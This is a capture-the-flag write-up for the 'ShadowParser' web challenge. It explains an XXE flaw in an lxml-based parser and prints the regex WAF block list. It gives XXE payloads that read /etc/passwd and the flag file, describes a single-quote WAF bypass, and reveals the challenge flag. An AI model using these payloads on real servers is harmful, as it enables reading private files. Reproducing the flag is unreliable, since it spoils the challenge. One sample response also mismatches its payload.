## Challenge Details
- **Category**: Web
- **Difficulty**: Medium

## Description
ShadowParser is an advanced XML processing tool that contains a hidden vulnerability. Can you find a way to exploit the XML parser to extract sensitive data from the server?

### Requirements
- XML knowledge
- Understanding of entity processing
- Web exploitation skills

![Challenge GIF](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExazkzend1eDc1dGVpaXkzY2ZxdWJqazJnOHlseGN0N25lN2Q0emZveCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/077i6AULCXc0FKTj9s/giphy.gif)

---

*Author: xtle0o0*

---

# ShadowParser - Solution

## Vulnerability

The ShadowParser application contains an XML External Entity (XXE) vulnerability in its XML parser configuration. Specifically, it uses `etree.XMLParser(resolve_entities=True)` which allows for the resolution of external entities.

## Web Application Firewall (WAF)

The application has a simplified WAF that blocks these specific patterns:
```python
WAF_PATTERNS = [
    r'<!ENTITY\s+\w+\s+SYSTEM\s+"file:',  # Only blocks the exact pattern with double quotes
    r'<!DOCTYPE\s+\w+\s+SYSTEM\s+"file:', # Only blocks direct SYSTEM with file:
    r'php://filter',                      # Still block some dangerous schemes
    r'expect://'
]
```

When the WAF detects these patterns, it returns the message: "hhhhhhhh Shablek ghir aji w di flag"

## Easy WAF Bypass Solutions

### Solution : Use Single Quotes
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY xxe SYSTEM 'file:/flag.txt'>
]>
<data><content>&xxe;</content></data>
```

## Full Exploitation Steps

### Step 1: Reconnaissance

After deploying the challenge, we're presented with a web interface for an XML parser. Let's test a basic XML payload to see how the system responds:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<test>Hello World</test>
```

Response:
```
XML parsed successfully!

Root element: test
Child elements: []
```

### Step 2: Testing for XXE and Encountering WAF

Let's try a standard XXE payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<test>&xxe;</test>
```

Response:
```
hhhhhhhh Shablek ghir aji w di flag
```

This indicates that a WAF is blocking our payload.

### Step 3: WAF Bypass Using Single Quotes

Based on the WAF patterns, we can see that it's only checking for double quotes in the pattern. 

### Step 4: Looking for the Flag

Now let's look for the flag file. A common location is in the root directory:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///flag.txt'> ]>
<test>&xxe;</test>
```

Response:
```
XML parsed successfully!

Root element: data
Child elements: ['content']

Element: content
  Content: Got Me LoL
Q01De2Q0cmtTaDRkMHdfcDRyczNyXzNudDF0eV9tNHN0M3J9

```

### Final Flag

**Flag**: `CMC{d4rkSh4d0w_p4rs3r_3nt1ty_m4st3r}`

## Summary

This challenge demonstrated:

1. An XXE vulnerability in an XML parser that allows external entity resolution
2. A poorly implemented WAF that only checks for specific patterns with double quotes
3. A simple bypass technique using single quotes instead of double quotes

